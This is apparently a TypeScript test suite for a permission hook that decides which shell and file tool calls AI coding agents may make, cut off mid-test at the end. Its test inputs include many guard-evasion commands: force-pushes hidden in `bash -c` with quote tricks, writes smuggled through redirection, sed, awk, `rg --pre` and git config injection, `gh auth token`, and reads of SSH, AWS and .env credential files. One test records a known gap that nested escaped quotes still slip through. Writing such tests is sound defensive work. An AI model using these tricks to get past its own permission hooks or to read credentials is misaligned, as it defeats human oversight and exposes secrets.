/**
 * One test per row of the invariant register in docs/divergence-register.md.
 *
 * Each test attempts the forbidden action and observes the denial, and each one
 * also asserts what the denial SAYS, because a thrown message reaches the model
 * verbatim (docs/specs/opencode-agents-port.md, "The tool hook") and is therefore
 * the only thing the agent has to comply with next turn. A denial that does not
 * quote the invariant is a denial the agent cannot act on.
 *
 * These exercise `decide`, which is the whole decision and is pure. The live
 * half - that a thrown message actually denies the call inside a running
 * OpenCode session, on a session whose agent was resolved by lookup - is
 * test/invariants/live.test.ts, and it is a separate file because it needs a
 * process and a mock endpoint where this needs neither.
 *
 * Run with: bun test test/invariants
 */

import { describe, expect, test } from "bun:test"
import { decide, recoverInterpreterPayloads } from "../../coder-fleet/lib/scope.ts"

const DIR = "/repo"

/** A bash call by `agent`, returning the denial message or undefined. */
function bash(agent: string, command: string): string | undefined {
  return decide({ agent, tool: "bash", args: { command }, directory: DIR })
}

function call(agent: string, tool: string, args: Record<string, unknown>): string | undefined {
  return decide({ agent, tool, args, directory: DIR })
}

/** Denied, and the message quotes an invariant rather than merely refusing. */
function expectDenied(reason: string | undefined, quoting: string) {
  // An empty fragment is contained in every string, so it would check only that
  // something denied the call, not that the rule under test did.
  expect(quoting).not.toBe("")
  expect(reason).toBeString()
  expect(reason).toContain("invariant:")
  expect(reason!.toLowerCase()).toContain(quoting.toLowerCase())
}

describe("the headline case: an interpreter payload is not a place to hide", () => {
  // This is the test the plan named. If it fails, the plugin has no reason to
  // exist: OpenCode's AST walk already denies a bare `git push --force` by
  // config, and `bash -c` is the one shape it cannot see into.
  test('bash -c "git push --force" is denied for coder', () => {
    expectDenied(bash("coder", 'bash -c "git push --force"'), "force-push")
  })

  test("every interpreter the AST treats as one node", () => {
    for (const shell of ["bash", "sh", "zsh", "dash", "ksh"]) {
      expectDenied(bash("coder", `${shell} -c "git push --force"`), "force-push")
    }
    expectDenied(bash("coder", `eval "git push --force"`), "force-push")
  })

  test("a path-qualified interpreter and a flag cluster ending in c", () => {
    expectDenied(bash("coder", '/bin/bash -c "git push --force"'), "force-push")
    expectDenied(bash("coder", '/bin/bash -lc "git push --force"'), "force-push")
    expectDenied(bash("coder", 'bash -xc "git push --force"'), "force-push")
  })

  test("quoting the interpreter or the command does not change which command runs", () => {
    // The fleet's header records that these two characters retired four of its
    // checks at once.
    expectDenied(bash("coder", 'b""ash -c "git push --force"'), "force-push")
    expectDenied(bash("coder", 'bash -c "\\"\\"git push --force"'), "force-push")
    expectDenied(bash("coder", 'bash -c "\\git push --force"'), "force-push")
  })

  test("nesting is caught while the innermost payload is single-quoted", () => {
    expectDenied(bash("coder", `zsh -c "sh -c \\"bash -c 'git push --force'\\""`), "force-push")
  })

  test("what escaping bounds, stated as a test rather than left in a comment", () => {
    // KNOWN GAP, inherited from the fleet deliberately. A payload is recovered
    // exactly as written, so a quote still carrying its backslash is invisible
    // to the next pass. This asserts the gap so that closing it is a visible
    // change rather than a surprise, and so nobody reads the row above as a
    // claim that nesting is always caught.
    expect(bash("coder", 'sh -c "bash -c \\"git push --force\\""')).toBeUndefined()
  })

  test("a wrapper is transparent to the shell and has to be transparent here", () => {
    // `env: 1` in OpenCode's arity table means `env git push --force` yields the
    // pattern `env *`, so no git rule ever matches it.
    for (const wrapper of ["env", "xargs", "nice", "timeout 5", "command", "nohup", "env -i"]) {
      expectDenied(bash("coder", `${wrapper} git push --force`), "force-push")
    }
    expectDenied(bash("coder", "GIT_DIR=/tmp/x git push --force"), "force-push")
  })

  test("the honest work of the same agent is not denied", () => {
    // A guard that denies ordinary work gets turned off, so the allow side is
    // part of the invariant rather than a courtesy.
    expect(bash("coder", "git push origin my-feature")).toBeUndefined()
    expect(bash("coder", "git commit -m 'a message with --force in it'")).toBeUndefined()
    expect(bash("coder", "npm test")).toBeUndefined()
    expect(bash("coder", 'bash -c "npm run build"')).toBeUndefined()
  })
})

describe("the redirection gate: the allowlist does not stop a write", () => {
  // The four commands below were all observed matching the allow rule beside
  // them. `source()` climbs to the redirected_statement parent so the redirect
  // text is in the pattern, and `Wildcard.match` compiles `cat *` to
  // `^cat( .*)?$` with the s flag, which matches the whole statement including
  // newlines. `parts()` skips redirection children, so the target never becomes
  // an external_directory ask either. Phase 3 concluded redirection was caught
  // because `echo hello > file` was denied; `echo` had failed the allowlist.
  const writesThatMatchAnAllowRule = [
    "cat CLAUDE.md > pwned.txt",
    "cat > pwned.txt <<'EOF'\nhi\nEOF",
    "tail -n1 a.md > pwned.txt",
    "grep -r x . > pwned.txt",
    "sed -n '1,5p' a.md > pwned.txt",
    "git log --oneline > pwned.txt",
  ]

  test("every one of them is denied for an agent that writes nothing", () => {
    for (const agent of ["scout", "reviewer", "researcher"]) {
      for (const cmd of writesThatMatchAnAllowRule) expectDenied(bash(agent, cmd), "creates or truncates pwned.txt")
    }
  })

  test("every redirection operator that creates or truncates a file", () => {
    for (const cmd of ["cat a > b", "cat a >> b", "cat a &> b", "cat a &>> b", "cat a >| b", "cat a 2> b"]) {
      expectDenied(bash("scout", cmd), "creates or truncates b")
    }
  })

  test("and through an interpreter payload, where the AST sees nothing at all", () => {
    // For scout the interpreter itself is off the allowlist, so that is the
    // reason given; recovering the payload matters for the agents whose shell
    // is not an allowlist, where the inner redirect is what gets named.
    expectDenied(bash("scout", 'bash -c "cat CLAUDE.md > pwned.txt"'), '"bash" is not one of the commands')
    expectDenied(bash("scout", `sh -c 'cat a > b'`), '"sh" is not one of the commands')
    expectDenied(bash("spec-writer", 'bash -c "cat a > src/x.ts"'), "creates or truncates /repo/src/x.ts")
    expectDenied(bash("spec-writer", `sh -c 'cat a > src/x.ts'`), "creates or truncates /repo/src/x.ts")
  })

  test("a descriptor duplication is not a write, and neither is /dev/null", () => {
    // These appear inside honest commands constantly. A gate that denies them
    // gets turned off, which is how a gate stops existing.
    expect(bash("scout", "ls -la x 2>&1")).toBeUndefined()
    expect(bash("scout", "ls -la x 2>/dev/null")).toBeUndefined()
    expect(bash("scout", "grep -c foo bar.txt 2>&1")).toBeUndefined()
    // The quotes are load-bearing: `>` inside a search pattern is not a
    // redirection.
    expect(bash("scout", "grep -R '=>' src")).toBeUndefined()
    expect(bash("scout", 'grep -R "a > b" src')).toBeUndefined()
  })

  test("a /dev/ prefix is judged after normalising, so /dev/.. is not a way out", () => {
    // The Phase 4 refuter wrote a file this way: the device check ran on the
    // raw target, before `..` was resolved.
    expectDenied(bash("scout", "cat CLAUDE.md > /dev/../repo/pwned.txt"), "creates or truncates /repo/pwned.txt")
    expectDenied(bash("scout", "cat a > /dev/shm/x"), "creates or truncates /dev/shm/x")
    expect(bash("scout", "cat a > /dev/stderr")).toBeUndefined()
    expect(bash("scout", "ls x 2>/dev/fd/2")).toBeUndefined()
  })

  test("every segment is checked, however many come before the write", () => {
    // `.slice(0, 16)` once dropped every segment after the sixteenth.
    const prefix = Array.from({ length: 16 }, () => "ls .").join(" && ")
    expectDenied(bash("scout", `${prefix} && cat a > pwned.txt`), "creates or truncates pwned.txt")
    expectDenied(bash("scout", `${prefix} && touch pwned.txt`), `"touch" is not one of the commands`)
    const tooMany = Array.from({ length: 300 }, () => "ls .").join(" ; ")
    expectDenied(bash("coder", tooMany), "too many commands")
  })

  test("a redirection whose target cannot be read is refused rather than waved through", () => {
    expectDenied(bash("scout", "cat a > $DEST"), "creates or truncates $DEST")
  })

  test("the posture is the boundary, not the agent", () => {
    // `free` agents redirect freely; `roots` agents redirect inside their roots
    // and nowhere else. One gate, three answers, no per-agent special case.
    expect(bash("coder", "cat a > b")).toBeUndefined()
    expect(bash("refuter", "cp -r . /tmp/m && echo x > /tmp/m/f")).toBeUndefined()
    expect(bash("spec-writer", "cat draft > docs/specs/x.md")).toBeUndefined()
    expectDenied(bash("spec-writer", "cat draft > src/x.ts"), "docs/specs")
    expectDenied(bash("spec-writer", "cat draft > docs/plans/x.md"), "docs/specs")
  })
})

describe("sed, find and git write through their arguments", () => {
  test("sed -n is not read-only", () => {
    // The one an author writing `"sed -n *": allow` never thinks of: this
    // writes a file with no redirection character anywhere in the command.
    expectDenied(bash("scout", "sed -n 'w /tmp/pwned.txt' file"), "that sed script - w /tmp/pwned.txt")
    expectDenied(bash("scout", "sed -n 's/a/b/w /tmp/pwned.txt' file"), "that sed script - s/a/b/w")
    expectDenied(bash("scout", "sed -n 'e touch /tmp/pwned' file"), "that sed script - e touch")
    expectDenied(bash("scout", "sed -e 'w /tmp/pwned.txt' file"), "that sed script - w /tmp/pwned.txt")
  })

  test("in-place editing, anywhere in the argv rather than only as the first flag", () => {
    for (const cmd of [
      "sed -i 's/a/b/' file",
      "sed -n -i.bak 's/a/b/' file",
      "sed --in-place 's/a/b/' file",
      "sed -ni 's/a/b/' file",
      "sed 's/a/b/' -i file",
    ]) {
      expectDenied(bash("scout", cmd), "sed -i edits the file in place")
    }
  })

  test("an honest sed is not denied, which is what keeps the check alive", () => {
    expect(bash("scout", "sed -n '1,50p' src/x.ts")).toBeUndefined()
    expect(bash("scout", "sed -n '/warning/p' log.txt")).toBeUndefined()
    // The script is read on its own. Scanning the whole command for a
    // standalone `w` denies this, which is a denial with no write behind it.
    expect(bash("scout", "grep w file")).toBeUndefined()
    expect(bash("scout", "grep w file | sed -n p")).toBeUndefined()
  })

  test("find runs programs through its own arguments", () => {
    expectDenied(bash("scout", "find . -name '*.ts' -exec sh -c 'rm {}' ;"), "find -exec")
    expectDenied(bash("scout", "find . -delete"), "find -exec")
    expectDenied(bash("scout", "find . -fprint /tmp/pwned.txt"), "find -exec")
    expect(bash("scout", "find . -name '*.ts' -type f")).toBeUndefined()
  })

  test("rg, sort and awk write or execute through their own arguments", () => {
    // `rg --pre` runs a program on every file it searches; the refuter ran one
    // through scout's `rg *` allow rule.
    expectDenied(bash("scout", "rg --pre ./evil.sh foo"), "--pre")
    expectDenied(bash("scout", "rg --pre=./evil.sh foo"), "--pre")
    expectDenied(bash("scout", "rg --pre-glob '*.md' --pre ./evil.sh foo"), "--pre")
    expectDenied(bash("reviewer", "sort -o pwned.txt a"), "sort")
    expectDenied(bash("reviewer", "sort --output=pwned.txt a"), "sort")
    expectDenied(bash("reviewer", "sort --compress-program=./evil.sh a"), "sort")
    expectDenied(bash("reviewer", `awk 'BEGIN{print "x" > "pwned.txt"}'`), "awk")
    expectDenied(bash("reviewer", `awk '{print | "sh"}' a`), "awk")
    expectDenied(bash("reviewer", `awk 'BEGIN{system("touch pwned")}'`), "awk")
    expectDenied(bash("reviewer", `awk -f prog.awk a`), "awk")
    // And the honest forms still pass, or the check gets switched off.
    expect(bash("scout", "rg -n foo src")).toBeUndefined()
    expect(bash("reviewer", "sort -u a | uniq -c")).toBeUndefined()
    expect(bash("reviewer", `awk '{print $2}' a`)).toBeUndefined()
    expect(bash("reviewer", `awk -F: '$3 > 100 {print $1}' /etc/passwd`)).toBeUndefined()
  })

  test("the git argv is the unit, not the git verb", () => {
    // `git diff --output=/tmp/pwned.txt` matches the allow rule `git diff *`.
    expectDenied(bash("scout", "git diff --output=/tmp/pwned.txt"), '"--output=/tmp/pwned.txt" makes git write')
    expectDenied(bash("scout", "git diff --output /tmp/pwned.txt"), '"--output" makes git write')
    expectDenied(bash("scout", "git log -o /tmp/pwned.txt"), '"-o" makes git write')
    // Config injection is arbitrary execution wearing a read verb's clothes.
    expectDenied(bash("scout", `git -c core.pager='sh -c "touch /tmp/x"' log`), '"-c" makes git write')
    expect(bash("scout", "git log --oneline -20")).toBeUndefined()
    expect(bash("scout", "git diff HEAD~1 -- src/")).toBeUndefined()
  })
})

describe("scout reads GitHub with gh and nothing else (CF-87, ported from CF-84)", () => {
  // The cases are the fleet's own, from claude/evals/lib/scope-hook-contract.sh,
  // with the denial fragment each must produce. gh holds the human's GitHub
  // credential, so it is allowed by group AND subcommand, and gh api only as
  // a plain GET.
  test("the read pairs, the repository flag and gh api as a GET are allowed", () => {
    for (const cmd of [
      "gh issue list -R rzem-ai/coder-fleet --state all --limit 50",
      "gh issue view 12 --comments",
      "gh pr view 42 --json title,body",
      "gh pr diff 42",
      "gh pr checks 42",
      "gh run view 123 --log",
      "gh repo view rzem-ai/coder-fleet",
      "gh release list",
      "gh label list",
      "gh search issues \"scope hook\" --repo rzem-ai/coder-fleet",
      "gh search code enforce_scout",
      "gh -R rzem-ai/coder-fleet issue list",
      "gh --repo=rzem-ai/coder-fleet pr list",
      "gh issue -R rzem-ai/coder-fleet view 3",
      "/opt/homebrew/bin/gh issue list | head -20",
      "gh api repos/rzem-ai/coder-fleet/issues?state=all --paginate --jq .title",
      "gh api -H Accept:application/vnd.github.raw repos/o/r/contents/README.md",
      "gh api --header=accept:application/vnd.github+json repos/o/r",
      "gh api --slurp -i -t x repos/o/r/issues",
      "gh api -X GET repos/o/r/issues",
      "gh api -X get repos/o/r/issues",
      "gh api -X=GET repos/o/r/issues",
      "gh api -XGET repos/o/r/issues",
      "gh api --method=GET repos/o/r/issues",
    ]) {
      expect(bash("scout", cmd), cmd).toBeUndefined()
    }
  })

  test("every write, every unlisted pair, and every way to build one, is denied", () => {
    for (const [cmd, says] of [
      ["gh issue create --title x --body y", "gh issue create"],
      ["gh issue close 1", "gh issue close"],
      ["gh pr merge 1 --squash", "gh pr merge"],
      ["gh pr review 1 --approve", "gh pr review"],
      ["gh pr checkout 1", "gh pr checkout"],
      ["gh release download v1", "gh release download"],
      ["gh repo clone o/r", "gh repo clone"],
      ["gh run rerun 1", "gh run rerun"],
      ["gh auth token", "gh auth"],
      ["gh auth status --show-token", "gh auth"],
      ["gh -R o/r auth token", "gh auth"],
      ["gh browse", "gh browse"],
      ["gh extension install owner/gh-x", "gh extension"],
      ["gh config set pager less", "gh config"],
      ["gh secret list", "gh secret"],
      ["gh issue frobnicate", "gh issue frobnicate"],
      ["gh issue", "read-only gh"],
      ["gh co 12", "gh co 12"],
      ["gh -R issue pr merge 1", "gh pr merge"],
      ["gh --hostname github.com issue list", "before the subcommand"],
      ["gh issue --state all list", "before the subcommand"],
      ["gh -- issue close 1", "before the subcommand"],
      ["gh api -X POST repos/o/r/issues", "gh api"],
      ["gh api -XPOST repos/o/r/issues", "gh api"],
      ["gh api --method=PUT repos/o/r/topics", "gh api"],
      ["gh api --method GET --method POST repos/o/r/issues", "gh api"],
      ["gh api -iX POST repos/o/r/issues", "gh api"],
      ["gh api repos/o/r/issues -f title=x", "gh api"],
      ["gh api repos/o/r/issues -Ftitle=x", "gh api"],
      ["gh api repos/o/r/issues --field=title=x", "gh api"],
      ["gh api repos/o/r/issues --raw-field title=x", "gh api"],
      ["gh api --cache 1h repos/o/r", "gh api"],
      ["gh api -H X-HTTP-Method-Override:POST repos/o/r/issues", "gh api"],
      ["gh api --header=Authorization:x repos/o/r", "gh api"],
      ["gh api repos/o/r/issues --input body.json", "gh api"],
      ["gh api repos/o/r --verbose", "gh api"],
      ["gh api repos/o/r/issues repos/o/r/pulls", "gh api"],
      ["gh api -H -f repos/o/r", "gh api"],
      ["gh api repos/o/r -H \"Accept: x\"", "gh api"],
      ["gh api repos/o/r/issues -q .x?", "gh api"],
      ["gh api repos/o/r/issues $'-f' title=x", "expands"],
      ["gh api repos/o/r/issues $\"-f\" title=x", "expands"],
      ["gh api repos/o/r/issues ${IFS}-XPOST", "expands"],
      ["gh api repos/o/r/issues $IFS-ftitle=x", "expands"],
      ["gh api repos/o/r/issues \"--method=POST\"", "quoted"],
      ["gh pr view 1 \"--web=true\"", "quoted"],
      ["gh pr view 1 -\"-web=true\"", "quoted"],
      ["gh issue view 1 --comments\"=x y\"", "quoted"],
      ["gh api repos/o/r/issues $V", "expands"],
      ["gh issue view 1 $N", "expands"],
      ["gh api repos/o/r/issues -{X,}POST", "expands"],
      ["gh issue view 1 -*", "expands"],
      ["echo -XPOST | xargs gh api repos/o/r/issues", "xargs"],
      ["echo 1 | xargs gh issue view", "xargs"],
      ["GH_TOKEN=x GH_CONFIG_DIR=/tmp/c gh search repos foo", "GH_TOKEN"],
      ["env HTTPS_PROXY=http://x gh issue list", "HTTPS_PROXY"],
      ["V=-XPOST; gh api repos/o/r/issues $V", "assign"],
      ["GH_REPO=rzem-ai/coder-fleet gh issue list", "GH_REPO"],
      ["echo /tmp/c | read GH_CONFIG_DIR; gh issue list", "read"],
      ["nice -n 5 X=1 gh issue list", "assigns X"],
      ["timeout 30 X=1 gh issue list", "assigns X"],
      ["for GH_HOST in evil.example; do gh issue list; done", "a for loop"],
      ["gh search repos foo --web", "--web"],
      ["gh issue view 1 -w", "--web"],
      ["gh issue view 1 -cw", "--web"],
      ["bash -c \"gh issue close 1\"", "\"bash\" is not one of the commands"],
      ["sh -c 'gh pr merge 1'", "\"sh\" is not one of the commands"],
      ["gh issue list | gh issue close 1", "gh issue close"],
      ["env gh issue close 1", "gh issue close"],
      ["gh issue list; gh issue close 1", "gh issue close"],
      ["gh issue list && gh pr merge 1", "gh pr merge"],
      ["gh issue list || gh auth token", "gh auth"],
      ["g\"\"h issue close 1", "gh issue close"],
      ["gh is''sue cl''ose 1", "gh issue close"],
      ["\\gh pr \\merge 1", "gh pr merge"],
      ["gh issue view \"$(gh auth token)\"", "gh"],
    ] as const) {
      expectDenied(bash("scout", cmd), says)
    }
  })

  test("only scout gets gh: the other read-only agents still have no gh at all", () => {
    expectDenied(bash("reviewer", "gh issue list"), '"gh" is not one of the commands')
    expectDenied(bash("researcher", "gh pr view 1"), '"gh" is not one of the commands')
  })
})

describe("fleet-steward cannot merge or push to a default branch", () => {
  test("merge, however it is spelled", () => {
    expectDenied(bash("fleet-steward", "git merge main"), "never merge")
    expectDenied(bash("fleet-steward", 'bash -c "git merge main"'), "never merge")
    expectDenied(bash("fleet-steward", "xargs git merge"), "never merge")
    // `git -C /path merge` reads its verb as `-C` under a naive parser, which
    // against a denylist ALLOWS a banned verb. The fleet fixed exactly this.
    expectDenied(bash("fleet-steward", "git -C /tmp/x merge main"), "never merge")
  })

  test("a push naming a default branch", () => {
    expectDenied(bash("fleet-steward", "git push origin main"), "default branch")
    expectDenied(bash("fleet-steward", "git push origin master"), "default branch")
    expectDenied(bash("fleet-steward", "git push origin HEAD:refs/heads/main"), "default branch")
    expectDenied(bash("fleet-steward", 'sh -c "git push origin main"'), "default branch")
  })

  test("history rewriting, and force-pushing anywhere", () => {
    for (const verb of ["rebase", "reset", "filter-branch", "filter-repo"]) {
      expectDenied(bash("fleet-steward", `git ${verb} x`), "history")
    }
    expectDenied(bash("fleet-steward", "git push --force origin migration"), "force-push")
  })

  test("the steward's own work is untouched", () => {
    expect(bash("fleet-steward", "git push origin migration-2026-09")).toBeUndefined()
    expect(bash("fleet-steward", "git log --oneline -20")).toBeUndefined()
    expect(bash("fleet-steward", "./evals/run.sh")).toBeUndefined()
  })
})

describe("reviewer, refuter, scout and researcher cannot edit", () => {
  const readOnly = ["reviewer", "refuter", "scout", "researcher"]

  test("the write tools are refused by name", () => {
    for (const agent of readOnly) {
      for (const tool of ["edit", "write", "apply_patch"]) {
        expectDenied(call(agent, tool, { filePath: "src/x.ts", patchText: "*** Update File: src/x.ts" }), "never")
      }
    }
  })

  test("refuter's write tools reach its scratch tree outside the project, and only that", () => {
    // The fleet gives refuter Write and Edit for the scratch tree it mutates.
    // The refusal is about where, not which tool: inside the project is denied
    // however the path is spelled, outside it is the job.
    for (const tool of ["edit", "write"]) {
      expect(call("refuter", tool, { filePath: "/tmp/refuter-1/src/x.ts" })).toBeUndefined()
      expect(call("refuter", tool, { filePath: "../scratch/src/x.ts" })).toBeUndefined()
      expectDenied(call("refuter", tool, { filePath: "/repo/src/x.ts" }), "never write inside the project")
      expectDenied(call("refuter", tool, { filePath: "/tmp/../repo/src/x.ts" }), "never write inside the project")
      expectDenied(call("refuter", tool, { filePath: "/repo" }), "never write inside the project")
    }
    expect(call("refuter", "apply_patch", { patchText: "*** Update File: /tmp/refuter-1/a.ts" })).toBeUndefined()
    // One path inside is enough to refuse the whole patch.
    expectDenied(
      call("refuter", "apply_patch", { patchText: "*** Update File: /tmp/refuter-1/a.ts\n*** Add File: src/b.ts" }),
      "never write inside the project",
    )
    // A write tool with no path it states cannot be shown to be outside.
    expectDenied(call("refuter", "write", {}), "never write inside the project")
    // `/repository` is a sibling of `/repo`, not inside it.
    expect(call("refuter", "write", { filePath: "/repository/x.ts" })).toBeUndefined()
  })

  test("and the shell routes to a write, for the three whose shell is an allowlist", () => {
    // refuter is deliberately absent: its invariant is "never write INSIDE the
    // project", because mutation testing is copy, change, run. See the register
    // row - the bash half of refuter's write rule is registered as unenforced,
    // exactly as it is in the fleet.
    for (const agent of ["reviewer", "scout", "researcher"]) {
      expectDenied(bash(agent, "echo mutated > src/x.ts"), "creates or truncates src/x.ts")
      expectDenied(bash(agent, "rm -rf src"), '"rm" is not one of the commands')
      // The redirection gate Phase 3's register asked for: an allowed read verb
      // becomes a write primitive the moment `>` is appended, and the pattern
      // OpenCode matches is the node's source text with the redirection in it,
      // so `cat a > b` matches `cat *` and writes a file.
      expectDenied(bash(agent, "cat src/x.ts > src/y.ts"), "creates or truncates src/y.ts")
      expectDenied(bash(agent, "cat src/x.ts >> src/y.ts"), "creates or truncates src/y.ts")
      expectDenied(bash(agent, 'bash -c "rm -rf src"'), '"bash" is not one of the commands')
      expectDenied(bash(agent, "sed -i 's/a/b/' src/x.ts"), "sed -i edits the file in place")
      expectDenied(bash(agent, "find . -name '*.ts' -delete"), "find -exec")
      // A sed script writes with no redirection character at all, and the
      // script is nearly always quoted.
      expectDenied(bash(agent, "sed -n 'w /tmp/proof' src/x.ts"), "that sed script - w /tmp/proof")
      // A command substitution hides its own command, and double quotes do not
      // disarm it.
      expectDenied(bash(agent, 'echo "$(rm -rf src)"'), "command substitution")
    }
  })

  test("reading, searching and read-only git still work", () => {
    for (const agent of ["reviewer", "scout"]) {
      expect(bash(agent, "ls -la src")).toBeUndefined()
      expect(bash(agent, "git log --oneline -5")).toBeUndefined()
      expect(bash(agent, "git diff HEAD~1")).toBeUndefined()
      expect(bash(agent, "sed -n '1,50p' src/x.ts")).toBeUndefined()
      // The quotes here are load-bearing: `=>` is a search pattern, not a
      // redirection, and stripping the quotes off it would deny honest work.
      expect(bash(agent, "grep -R '=>' src")).toBeUndefined()
    }
  })

  test("refuter may run anything except a git verb that writes", () => {
    expect(bash("refuter", "cp -r . /tmp/mutant && cd /tmp/mutant && npm test")).toBeUndefined()
    expectDenied(bash("refuter", "git commit -m 'fixed it'"), "never fix what you find")
    expectDenied(bash("refuter", 'bash -c "git commit -m x"'), "never fix what you find")
  })
})

describe("spec-writer cannot write outside docs/specs/", () => {
  test("a plan, source, config or a test is refused", () => {
    for (const p of ["docs/plans/x.md", "src/x.ts", "opencode.json", "test/x.test.ts", "../elsewhere/x.md"]) {
      expectDenied(call("spec-writer", "write", { filePath: p }), "docs/specs")
    }
  })

  test("apply_patch states its paths inside the patch text, and they are read", () => {
    // A rule that only reads `filePath` lets the whole tool through.
    expectDenied(
      call("spec-writer", "apply_patch", { patchText: "*** Update File: src/x.ts\n@@\n-a\n+b\n" }),
      "docs/specs",
    )
  })

  test("a sibling directory that shares the root's name is outside it", () => {
    expectDenied(call("spec-writer", "write", { filePath: "docs/specsX/a.md" }), "docs/specs")
    expectDenied(call("spec-writer", "write", { filePath: "/repo/docs/specsX/a.md" }), "docs/specs")
  })

  test("a spec is written without complaint", () => {
    expect(call("spec-writer", "write", { filePath: "docs/specs/opencode-agents-port.md" })).toBeUndefined()
    expect(call("spec-writer", "write", { filePath: "/repo/docs/specs/x.md" })).toBeUndefined()
  })

  test("a path that climbs back out is resolved before it is judged", () => {
    expectDenied(call("spec-writer", "write", { filePath: "docs/specs/../plans/x.md" }), "docs/specs")
  })
})

describe("coder cannot force-push or rewrite published history", () => {
  test("every force-push spelling", () => {
    for (const cmd of [
      "git push --force",
      "git push -f origin main",
      "git push --force-with-lease origin x",
      "git push --mirror origin",
      "git push --delete origin old-branch",
      "git push origin +main:main",
      "git push origin main --force",
    ]) {
      expectDenied(bash("coder", cmd), "force-push")
    }
  })

  test("filter-branch and filter-repo", () => {
    expectDenied(bash("coder", "git filter-branch --tree-filter x HEAD"), "rewrites published history")
    expectDenied(bash("coder", "git filter-repo --path x"), "rewrites published history")
  })
})

describe("coder cannot read a credential file", () => {
  // Ported from the fleet's session-wide deny list in home/settings.json, and
  // applied to every agent rather than to coder alone - narrowing it would make
  // it weaker than the thing it is ported from.
  const credentials = [
    "~/.ssh/id_rsa",
    "/Users/alex/.ssh/config",
    "~/.aws/credentials",
    ".env",
    "src/.env.production",
    "~/.vault-token",
    "~/.vault/token",
    "~/.config/op/config",
    "~/.config/coder-fleet/linear.token",
    "/home/someone/.config/coder-fleet",
    "~/.claude/.credentials.json",
    "~/.netrc",
    "~/.npmrc",
    "~/.gnupg/secring.gpg",
  ]

  test("through the read tool", () => {
    for (const p of credentials) expectDenied(call("coder", "read", { filePath: p }), "credential")
  })

  test("through the shell, and through an interpreter payload", () => {
    for (const p of credentials) {
      expectDenied(bash("coder", `cat ${p}`), "credential")
      expectDenied(bash("coder", `bash -c "cat ${p}"`), "credential")
    }
  })

  test("for every other agent too, including ones with no rules of their own", () => {
    for (const agent of ["lead", "tech-writer", "ui-designer", "researcher", "build"]) {
      expectDenied(call(agent, "read", { filePath: "~/.ssh/id_rsa" }), "credential")
    }
  })

  test("an ordinary file with a similar name is not caught", () => {
    expect(call("coder", "read", { filePath: "docs/environment.md" })).toBeUndefined()
    expect(call("coder", "read", { filePath: "src/env.ts" })).toBeUndefined()
    expect(bash("coder", "cat .envrc.example")).toBeUndefined()
  })
})

describe("OpenCode 2.x states its tool calls in its own words, and every rule still reads them", () => {
  // 2.x calls the shell tool `shell`, names a file `path` rather than
  // `filePath`, calls apply_patch `patch`, and lets a shell call carry its own
  // `workdir`. A rule that only knew the 1.x words would let every one of those
  // calls through with nothing said.
  const shell = (agent: string, command: string, workdir?: string) =>
    decide({ agent, tool: "shell", args: workdir === undefined ? { command } : { command, workdir }, directory: DIR })

  // One command per shell-path denial in `decide`, each with the agent whose
  // rule it hits. The `bash` answer is the reference: `shell` must say the same.
  const SHELL_DENIALS: [agent: string, command: string][] = [
    ["coder", 'bash -c "git push --force"'],
    ["coder", "git push origin +main:main"],
    ["coder", "git filter-branch --tree-filter x HEAD"],
    ["coder", "cat .env"],
    ["fleet-steward", "git push origin main"],
    ["fleet-steward", "git merge feature"],
    ["scout", "cat CLAUDE.md > pwned.txt"],
    ["scout", "npm test"],
    ["scout", "git diff --output=/tmp/pwned.txt"],
    ["scout", "gh issue close 1"],
    ["scout", "gh auth token"],
    ["scout", "gh --hostname x issue list"],
    ["scout", "gh api -X POST repos/o/r/issues"],
    ["scout", "gh issue list --web"],
    ["scout", "GH_HOST=x gh issue list"],
    ["scout", "echo 1 | xargs gh issue view"],
    ["scout", "cat $(echo a)"],
    ["scout", "sed -n 'w /tmp/x' a.md"],
    ["reviewer", "sed -i s/a/b/ x"],
    ["reviewer", "find . -delete"],
    ["reviewer", "sort -o out.txt in.txt"],
    ["refuter", "git commit -m fix"],
    ["coder", Array.from({ length: 300 }, () => "true").join(" && ")],
  ]

  test("every shell denial is the same denial when the tool is called shell", () => {
    for (const [agent, command] of SHELL_DENIALS) {
      const reference = bash(agent, command)
      expect(reference, `${agent}: ${command} is not denied as bash, so the case tests nothing`).toBeString()
      expect(shell(agent, command)).toBe(reference)
    }
  })

  test("an allowed shell command is still allowed", () => {
    expect(shell("coder", "git push origin feat")).toBeUndefined()
    expect(shell("scout", "git log --oneline")).toBeUndefined()
  })

  test("the write tools are read through `path`, and patch through its patch text", () => {
    expectDenied(call("scout", "write", { path: "x.md", content: "x" }), "never edit")
    expectDenied(call("reviewer", "edit", { path: "src/x.ts", oldString: "a", newString: "b" }), "never edit")
    expectDenied(call("refuter", "write", { path: "src/x.ts", content: "x" }), "never write inside the project")
    expect(call("refuter", "write", { path: "/tmp/refuter-1/src/x.ts", content: "x" })).toBeUndefined()
    expectDenied(call("spec-writer", "write", { path: "src/x.ts", content: "x" }), "docs/specs")
    expectDenied(call("spec-writer", "patch", { patchText: "*** Add File: src/x.ts\n+a\n" }), "docs/specs")
    expectDenied(call("coder", "read", { path: "/repo/.env" }), "credential")
  })

  test("a redirect is judged from the shell call's own workdir", () => {
    // spec-writer has no shell in its frontmatter; this is the second lock. A
    // relative target is relative to where the shell runs, and `workdir` moves
    // that, so `docs/specs/a.md` from /tmp is /tmp/docs/specs/a.md.
    expect(shell("spec-writer", "echo x > docs/specs/a.md")).toBeUndefined()
    expectDenied(shell("spec-writer", "echo x > docs/specs/a.md", "/tmp"), "outside /repo/docs/specs")
    expectDenied(shell("spec-writer", "echo x > a.md", "docs"), "outside /repo/docs/specs")
    expect(shell("spec-writer", "echo x > a.md", "docs/specs")).toBeUndefined()
    expect(shell("scout", "cat a 2> null", "/dev")).toBeUndefined()
  })

  test("a workdir does not carry a command past the credential lock", () => {
    // The workdir itself is a path the call reaches into, so a credential
    // directory is refused whatever the command names inside it.
    expectDenied(shell("coder", "cat config", "~/.ssh"), "credential")
    expectDenied(shell("coder", "cat credentials", "~/.aws"), "credential")
    expectDenied(shell("coder", "ls", "/home/someone/.gnupg"), "credential")
    expectDenied(shell("coder", "cat id_rsa", "~/.ssh"), "credential")
    // The credential lock is fleet-wide, so it holds for an agent with no row.
    expectDenied(shell("build", "cat config", "~/.ssh"), "credential")
    expectDenied(shell("coder", "cat .ssh/id_rsa", "~"), "credential")
    // A word that is harmless alone and a credential once resolved from the
    // workdir: `op/token` from ~/.config is ~/.config/op/token.
    expectDenied(shell("coder", "cat op/token", "/home/someone/.config"), "credential")
    expectDenied(shell("coder", "cat coder-fleet/key", "/home/someone/.config"), "credential")
